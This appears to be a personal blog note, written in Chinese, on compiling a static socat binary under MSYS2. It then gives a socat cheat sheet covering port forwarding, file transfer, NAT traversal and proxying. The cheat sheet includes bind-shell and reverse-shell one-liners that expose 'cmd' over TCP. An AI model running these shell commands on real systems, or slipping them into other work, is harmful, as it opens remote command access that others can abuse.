---
author: XhstormR
tags:
  - Notes
date: 2020-01-28T21:49:39+08:00
title: 构建 socat
---

<!--more-->

Updated on 2020-01-28

> {{< image "uploads/doorway.svg" "doorway" "1" "1" >}}
>
> [MSYS2](https://mirrors.tuna.tsinghua.edu.cn/msys2/distrib/msys2-x86_64-latest.tar.xz)
>
> [socat](http://www.dest-unreach.org/socat/download/socat-1.7.3.4.tar.gz)

## Step

```bash
D:\Work\Download\socat>

pacman -Syu
pacman -S --noconfirm --needed gcc make libreadline-devel

./configure CFLAGS='-s -static -Os' && make
```

```bash
单向模式:
-u in -> out
-U out <- in

Bind Shell
----
LHOST:
ncat 127.0.0.1 1234
or
socat tcp-connect:127.0.0.1:1234 readline
RHOST:
socat tcp-listen:1234,fork,reuseaddr exec:"cmd",pty,stderr

Reverse Shell
----
LHOST:
socat tcp-listen:1234,fork,reuseaddr readline
RHOST:
socat tcp-connect:127.0.0.1:1234 exec:"cmd",pty,stderr

单进程应用 -> 多进程服务
----
LHOST:
socat -u tcp-connect:127.0.0.1:1234 -
RHOST:
socat -U tcp-listen:1234,fork,reuseaddr exec:"busybox ps",pty,stderr

监听端口
----
LHOST:
socat tcp-listen:1234,fork,reuseaddr -
RHOST:
ncat 127.0.0.1 1234
or
curl 127.0.0.1:1234

端口转发
----
socat tcp-listen:1234,fork,reuseaddr tcp-connect:192.168.1.19:3389

写入文件
----
echo 123 | socat -u - ./123.txt
or
echo 123 | socat -u - open:123.txt,wronly,create,append

读取文件
----
socat -U - ./123.txt
or
socat -U - open:123.txt,rdonly

文件传输
----
LHOST:
socat -u tcp-connect:127.0.0.1:1234 open:123.txt,wronly,create,trunc
RHOST:
socat -U tcp-listen:1234,fork,reuseaddr open:123.txt,rdonly

内网穿透（不推荐）
----
公网：
socat tcp-listen:1234,fork,reuseaddr tcp-listen:8080
内网：
socat tcp-connect:47.98.135.65:1234 tcp-connect:192.168.1.19:80
客户端：
curl 47.98.135.65:8080

SSH 设置 HTTP PROXY
----
ssh -o ProxyCommand='socat - PROXY:127.0.0.1:%h:%p,proxyport=8080' root@192.168.2.2
```

## Reference

- http://www.dest-unreach.org/socat/doc/socat.html
